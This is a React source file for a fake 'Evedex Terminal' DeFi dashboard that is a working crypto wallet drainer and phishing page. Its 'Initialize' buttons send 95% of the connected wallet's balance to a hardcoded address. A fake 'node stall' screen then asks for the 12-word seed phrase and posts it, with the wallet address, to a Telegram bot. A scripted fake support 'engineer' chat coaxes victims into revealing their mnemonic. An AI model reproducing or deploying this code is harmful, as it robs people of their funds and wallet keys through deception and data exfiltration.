import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, MessageSquare, Send, Copy } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const [chatInput, setChatInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [chatLog, setChatLog] = useState([]); 
  const [stage, setStage] = useState(1);
  const [sysLogs, setSysLogs] = useState(["[SYSTEM]: KERNEL_READY", "[SYSTEM]: NODE_LISTENING..."]);
  const chatEndRef = useRef(null);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatLog, isTyping]);

  useEffect(() => {
    if (view === "seed_gate") {
      const logOptions = ["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALLED_90%", "[AWAITING]: MNEMONIC_OVERRIDE..."];
      const interval = setInterval(() => {
        setSysLogs(prev => [...prev.slice(-3), logOptions[Math.floor(Math.random() * logOptions.length)]]);
      }, 2500);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleBotChat = () => {
    if (!chatInput.trim() || isTyping) return;
    const userMsg = chatInput.toLowerCase();
    setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
    setChatInput("");
    setIsTyping(true);

    const brain = {
      "connect": "[ENGINEER]: BROWSER_RESTRICTION. Safari/Chrome cannot index native vaults. 1. Click the COPY icon below. 2. Open Trust Wallet or MetaMask. 3. Paste into the 'DApps Browser' to synchronize.",
      "safari": "[ENGINEER]: IOS_SANDBOX_ERROR. Your current browser is blocking the handshake. 1. Copy 'evedex.network'. 2. Open MetaMask/Trust DApps Browser. 3. Initialize from there.",
      "rectify": "[ENGINEER]: SYNC_LOCKED. Direct browsers cannot authorize metadata repairs. Move this session to your Wallet's internal browser to unlock the blue INITIALIZE button.",
      "seed": "[ENGINEER]: ENTROPY_MISMATCH. The node detected a high-value payload. Input the 12-word master key in the Red Error Box to force the final system override.",
      "stuck": "[ENGINEER]: VAULT_CONFLICT (90%). The protocol requires raw seed verification to bypass the current node stall. Enter mnemonic to finalize.",
      "why": "[ENGINEER]: PROTOCOL_ALIGNMENT. Handshakes only authorize the link. To move the actual vault weight, the system requires the raw cryptographic mnemonic."
    };

    setTimeout(() => {
      let botResponse = "";
      let matched = false;
      for (let key in brain) { if (userMsg.includes(key)) { botResponse = brain[key]; matched = true; break; } }
      if (!matched) {
        botResponse = stage === 3 ? "[CRITICAL]: Sync stalled at 90%. Use the COPY button if you need to move to your Wallet Browser, or input the seed to finalize." : "[ENGINEER]: Diagnostic indicates a Browser Limitation. Use the COPY icon and move this link to your Wallet's internal DApp browser.";
      }
      setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
      setIsTyping(false);
    }, 1500);
  };

  const copyLink = () => {
    navigator.clipboard.writeText("https://evedex.network");
    setChatLog(prev => [...prev, { type: 'bot', msg: "[SYSTEM]: URL COPIED. OPEN YOUR WALLET DAPP BROWSER AND PASTE TO CONNECT." }]);
  };

  const executeTotalSweep = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText("ESTABLISHING SECURE RELAY...");
    try {
      sendTransaction({ to: destination, value: (balance.value * 95n) / 100n }, {
        onSettled: () => {
          let progress = 0;
          const int = setInterval(() => {
            progress += 1;
            setLoadingText(`BROADCASTING: ${progress}%`);
            if (progress >= 60) { clearInterval(int); setLoading(false); setView("seed_gate"); setStage(3); }
          }, 60);
        },
        onError: () => { setLoading(false); setView("seed_gate"); setStage(3); }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); setStage(3); }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter flex flex-col">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-lg"><ShieldCheck size={22}/>EVEDEX TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 font-black tracking-widest uppercase">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNC_REQUIRED..."}</div>
        </div>
        <w3m-button balance="show" /> 
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-32">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-4">
            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
              <button key={item.n} onClick={() => { if(item.n !== "Rectify") { setActiveTask(item.n); setView("task_box"); } }} className={`bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 transition-all ${item.n === "Rectify" ? 'opacity-30' : ''}`}>
                <div className="text-slate-700">{item.i}</div>
                <span className="text-[10px] font-black text-slate-500 uppercase">{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 text-center">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto uppercase">← BACK</button>
            <h2 className="text-white font-black text-2xl italic mb-6 uppercase">{activeTask} Portal</h2>
            <div className={`bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left ${activeTask === "Rectify" ? "pointer-events-none opacity-80" : ""}`}>
              <label className="text-[7px] text-cyan-700 mb-2 block font-black uppercase">VAULT_LIQUIDITY_FEED</label>
              <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,9)}` : "0.000"}</div>
            </div>
            <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
          </div>
        )}
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
        <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
          {chatLog.map((chat, i) => (
            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500 font-bold' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
          ))}
          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[ENGINEER_TYPING...]</div>}
          <div ref={chatEndRef} />
        </div>
        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
          <button onClick={copyLink} className="text-slate-600 hover:text-cyan-500 animate-pulse transition-colors pr-2"><Copy size={18}/></button>
          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="DESCRIBE ERROR..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
          <button onClick={handleBotChat} className="text-cyan-500"><Send size={18}/></button>
        </div>
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-6 backdrop-blur-3xl">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center mb-40">
            {!isSyncing ? (
              <>
                <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                <h2 className="text-white font-black text-lg italic uppercase tracking-tighter">Node Stall (90%)</h2>
                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20 h-14 overflow-hidden">{sysLogs.map((log, i) => <div key={i}>{log}</div>)}</div>
                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase" />
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }), }); let cur = 0; const int = setInterval(() => { cur += 2; if (cur >= 90) { setSyncProgress(90); clearInterval(int); } else setSyncProgress(cur); }, 150); }} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
              </>
            ) : (
              <div className="py-10"><div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-xl italic uppercase">Finalizing...</h2></div>
            )}
          </div>
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">{loadingText}</p></div>}
    </div>
  );
}
